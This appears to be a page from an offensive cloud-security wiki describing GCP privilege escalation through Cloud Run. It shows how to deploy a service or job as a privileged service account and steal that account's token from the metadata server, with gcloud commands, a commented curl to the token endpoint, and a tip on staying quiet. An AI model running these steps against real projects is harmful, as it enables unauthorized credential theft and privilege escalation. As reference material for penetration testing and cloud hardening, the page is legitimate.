---
title: "Cloud Run: run a container as the attached service account"
description: "Deploying a Cloud Run service or job with run.services.create plus actAs, executing attacker containers as the attached service account."
keywords:
  - Cloud Run
  - run.services.create
  - actAs
  - service account
  - container deploy
  - job
---

# Cloud Run

With `run.services.create` (or `run.jobs.create`) and `actAs` on a service account, you deploy a container that runs as that account. Point it at an image you control and read the token from the metadata server inside the container.

## Deploy a service as a privileged account

```bash
gcloud run deploy pwn --image=gcr.io/<your-project>/leak --region=<region> \
  --service-account=<privileged-sa>@<project>.iam.gserviceaccount.com --allow-unauthenticated
# the container fetches the token:
# curl -H "Metadata-Flavor: Google" \
#   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl "$(gcloud run services describe pwn --region=<region> --format='value(status.url)')"
```

A Cloud Run **job** is the quieter batch equivalent (`gcloud run jobs create ... --execute-now`) when you do not want a public URL.

## Exploitation notes

- The image can live in your own project if the deploying account can pull it; otherwise push to a repository the target project reads.
- `--service-account` exercises `actAs`; omit it and the service runs as the Compute default account.
- Gen2 Cloud Functions are Cloud Run services, so the two paths converge.

## Tools

- **gcloud** (`run deploy`, `run jobs create`, `run services describe`): deploy and reach the service.

## References

- [Rhino Security Labs: GCP privilege escalation (part 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google: Cloud Run service identity](https://cloud.google.com/run/docs/securing/service-identity)
